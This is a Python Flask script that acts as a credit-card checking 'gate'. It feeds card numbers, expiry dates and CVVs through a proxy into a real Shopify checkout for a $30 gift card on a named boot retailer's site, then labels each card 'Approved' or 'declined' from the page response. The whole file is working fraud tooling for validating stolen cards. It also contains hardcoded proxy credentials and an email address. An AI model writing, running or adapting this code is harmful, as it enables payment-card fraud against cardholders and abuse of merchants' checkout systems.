import requests, re, json
from bs4 import *
from colorama import Fore
from time import sleep
from flask import Flask, jsonify, request

#--------------------------------------------------------------#

app = Flask(__name__)

def cc8(cf):
	if '/' in cf:
		cf = cf.replace('/','|')
	elif ' ' in cf:
		cf = cf.replace(' ','|')
	elif ':' in cf:
		cf = cf.replace(':','|')
	else:
		cf = cf
	return cf


def cctot(jj):
	cc3 = jj
	cc = jj.split('|')[0]
	mes = jj.split('|')[1]
	ano = jj.split('|')[2]
	cvv = jj.split('|')[3]
	return json.dumps({
		"cc":cc,
		"mes":mes,
		"ano":ano,
		"cvv":cvv
	},indent=4)

def gate(cx):
	cx = cc8(cx)
	cc = cctot(cx)
	ccm = json.loads(cc)
	cc = ccm['cc']
	cc = f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}"
	mes = ccm['mes']
	if mes.startswith('0'):
		mes = mes.split('0')[1].strip()
	else:
		mes = mes
	mes = int(mes)
	ano = ccm['ano']
	if not ano.startswith('20'):
		ano = f"20{ano}"
	else:
		ano = ano
	ano = int(ano)
	cvv = ccm['cvv']
	r = requests.session()
	url_prox = "http://5jyhut1y7txru6p:brxph1y0r457hoa@rp.proxyscrape.com:6060"
	proxy = {
		"http":url_prox,
		"https":url_prox
	}
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'if-none-match': 'W/"cacheable:0fa6e72eb4f146a61c19e8c8994d092f"',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	r.get('https://thursdayboots.com/products/gift-cards',headers=headers,proxies=proxy)
	
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjM4NDE4NDEiLCJhcCI6IjU5NDQwMjcxMSIsImlkIjoiZTUwYmY4ZTc0MTI1ZjRhZSIsInRyIjoiZjA3ZTk2OGQ3MmMxNTdmMTFkZWNkMTUxM2Y3MjFlMDAiLCJ0aSI6MTcwODUxOTk3ODEzNX19',
    'origin': 'https://thursdayboots.com',
    'referer': 'https://thursdayboots.com/products/gift-cards?variant=40228103061594',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'traceparent': '00-f07e968d72c157f11decd1513f721e00-e50bf8e74125f4ae-01',
    'tracestate': '3841841@nr=0-1-3841841-594402711-e50bf8e74125f4ae----1708519978135',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	json_data = {
    'id': 40228103061594,
    'quantity': 1,
    'properties': {},
}

	req2 = r.post('https://thursdayboots.com/cart/add.js',headers=headers, json=json_data,proxies=proxy)
	if 'Digital Gift Card - $30","price' in req2.text:
		print(Fore.GREEN+"Done Add product")
	else:
		print(Fore.RED+"Gate Is dead")
		exit()
	
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://thursdayboots.com/products/gift-cards?variant=40228103061594',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	req3 = r.get('https://thursdayboots.com/checkout', headers=headers,proxies=proxy)
	req3_url = req3.url
	token1 = re.findall(r'name="authenticity_token" value="(.*?)"',req3.text)[0]
	
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',

    'origin': 'https://thursdayboots.com',
    'referer': 'https://thursdayboots.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	data = [
    ('_method', 'patch'),
    ('authenticity_token', token1),
    ('previous_step', 'contact_information'),
    ('step', 'payment_method'),
    ('checkout[email]', 'tvahmedsat@gmail.com'),
    ('checkout[billing_address][first_name]', ''),
    ('checkout[billing_address][last_name]', ''),
    ('checkout[billing_address][address1]', ''),
    ('checkout[billing_address][address2]', ''),
    ('checkout[billing_address][city]', ''),
    ('checkout[billing_address][country]', ''),
    ('checkout[billing_address][province]', ''),
    ('checkout[billing_address][zip]', ''),
    ('checkout[billing_address][phone]', ''),
    ('checkout[billing_address][country]', 'United States'),
    ('checkout[billing_address][first_name]', 'zeko'),
    ('checkout[billing_address][last_name]', 'memk'),
    ('checkout[billing_address][address1]', 'New York-New York Hotel & Casino'),
    ('checkout[billing_address][address2]', ''),
    ('checkout[billing_address][city]', 'Las Vegas'),
    ('checkout[billing_address][province]', 'NV'),
    ('checkout[billing_address][zip]', '89109'),
    ('checkout[billing_address][phone]', ''),
    ('checkout[remember_me]', 'false'),
    ('checkout[remember_me]', '0'),
    ('checkout[client_details][browser_width]', '583'),
    ('checkout[client_details][browser_height]', '588'),
    ('checkout[client_details][javascript_enabled]', '1'),
    ('checkout[client_details][color_depth]', '24'),
    ('checkout[client_details][java_enabled]', 'false'),
    ('checkout[client_details][browser_tz]', '0'),
    ('button', ''),
]

	res3 = r.post(
    req3_url,
    headers=headers,
    data=data,
    proxies=proxy
	)
	
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://thursdayboots.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	params = {
    'previous_step': 'contact_information',
    'step': 'payment_method',
}

	req5 = r.get(
    req3_url,
    params=params,
    headers=headers,
    proxies=proxy
	)
	token2 = re.findall(r'name="authenticity_token" value="(.*?)"',req5.text)[0]
	gate = re.findall(r'payment_gateway_(.*?)_description',req5.text)[1]
	
	headers = {
    'authority': 'deposit.us.shopifycs.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://checkout.shopifycs.com',
    'referer': 'https://checkout.shopifycs.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	json_data = {
    'credit_card': {
        'number': cc,
        'name': 'Zeko mejk',
        'month': mes,
        'year': ano,
        'verification_value': cvv,
    },
    'payment_session_scope': 'thursdayboots.com',
}

	req6 = r.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data,proxies=proxy)
	if 'id' in req6.text:
		id = req6.json()['id']
	else:
		print(Fore.RED+"Error For Get Id")
		exit()
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://thursdayboots.com',
    'referer': 'https://thursdayboots.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	data = {
    '_method': 'patch',
    'authenticity_token': token2,
    'previous_step': 'payment_method',
    'step': '',
    's': id,
    'checkout[payment_gateway]': gate,
    'checkout[credit_card][vault]': 'false',
    'checkout[total_price]': '3000',
    'checkout_submitted_request_url': '',
    'checkout_submitted_page_id': '',
    'complete': '1',
    'checkout[client_details][browser_width]': '600',
    'checkout[client_details][browser_height]': '588',
    'checkout[client_details][javascript_enabled]': '1',
    'checkout[client_details][color_depth]': '24',
    'checkout[client_details][java_enabled]': 'false',
    'checkout[client_details][browser_tz]': '0',
}

	r.post(
    req3_url,
    headers=headers,
    data=data,
    proxies=proxy)
	
	
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://thursdayboots.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	req8 = r.get(
    f'{req3_url}/processing',
    headers=headers,
    proxies=proxy
	)
	sleep(10)
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://thursdayboots.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	params = {
    'from_processing_page': '1',
}

	req9 = r.get(
    f'{req3_url}/processing',
    params=params,
    headers=headers,
	)
	sleep(10)
	headers = {
    'authority': 'thursdayboots.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://thursdayboots.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	params = {
    'from_processing_page': '1',
    'validate': 'true',
}

	req10 = r.get(
    req3_url,
    params=params,
    headers=headers,
    proxies=proxy
	)
	
	if 'Thank you for your purchase!' in req10.text or 'Your order is confirmed' in req10.text or 'Thank you' in req10.text:
		msg = 'Approved'
		data = {
			"Card": cx,
			"Response": msg,
			"Gate": "Shopify + Braintree $30",
			"status": "Approved"
		}
		return data

	elif "2010 Card Issuer Declined CVV" in req10.text:
		msg = "2010 Card Issuer Declined CVV"
		data = {
			"Card": cx,
			"Response": msg,
			"Gate": "Shopify + Braintree $30",
			"status": "Approved"
			}
		return data
	
	elif "2001 Insufficient Funds" in req10.text:
		msg = "2001 Insufficient Funds"
		data = {
			"Card": cx,
			"Response": msg,
			"Gate": "Shopify + Braintree $30",
			"status": "Approved"
			}
		return data
	
	elif 'notice__text' in req10.text:
		soup = BeautifulSoup(req10.content, 'html.parser')
		error_element = soup.find('p', {'class': 'notice__text'})
		msg = error_element.text
		data = {
			"Card": cx,
			"Response": msg,
			"Gate": "Shopify + Braintree $30",
			"status": "declined"
		}
		return data
	
@app.route('/')
def index():
	for _ in range(3):
		try:
			lista = request.args.get('lista')
			result = gate(lista)
			return jsonify(result)
		except Exception:
			continue
	else:
		data = {
			"Card": cx,
			"Response": "Proxy Error",
			"Gate": "Shopify + Braintree $30",
			"status": "declined"
		}
		return jsonify(data)


if __name__ == '__main__':
    app.run(debug=True)

#print(gate('5568628200664267|12|2030|581'))
